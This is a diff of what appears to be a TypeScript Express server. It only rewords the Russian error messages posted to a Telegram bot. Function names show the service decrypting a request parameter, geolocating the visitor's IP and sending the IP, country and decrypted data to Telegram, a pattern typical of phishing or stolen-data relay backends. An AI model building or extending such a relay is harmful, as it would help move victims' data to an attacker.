@@ -65,7 +65,7 @@ app.get('/', async (req, res) => {
   } catch (error) {
     await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
       chat_id: TELEGRAM_CHAT_ID,
-      text: `ОШИБКА: ${error}`,
+      text: `ОШИБКА в мэйне: ${error}`,
       parse_mode: 'Markdown'
     });
     res.status(500).send('Internal Server Error');
@@ -94,7 +94,7 @@ async function decryptNocache(nocache: any) {
   } catch (error) {
     await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
       chat_id: TELEGRAM_CHAT_ID,
-      text: `ОШИБКА: ${error}`,
+      text: `ОШИБКА при декрипте: ${error}`,
       parse_mode: 'Markdown'
     });
     return { error: 'Failed to decrypt data' };
@@ -111,7 +111,7 @@ async function getCountryByIp(ip: any) {
   } catch (error) {
     await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
       chat_id: TELEGRAM_CHAT_ID,
-      text: `ОШИБКА: ${error}`,
+      text: `ОШИБКА при получение страны: ${error}`,
       parse_mode: 'Markdown'
     });
     return 'Error';
@@ -141,7 +141,7 @@ async function sendToTelegram(ip: any, country: any, decryptedData:any) {
   } catch (error) {
     await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
       chat_id: TELEGRAM_CHAT_ID,
-      text: `ОШИБКА: ${error}`,
+      text: `ОШИБКА при отправке результата: ${error}`,
       parse_mode: 'Markdown'
     });
   }
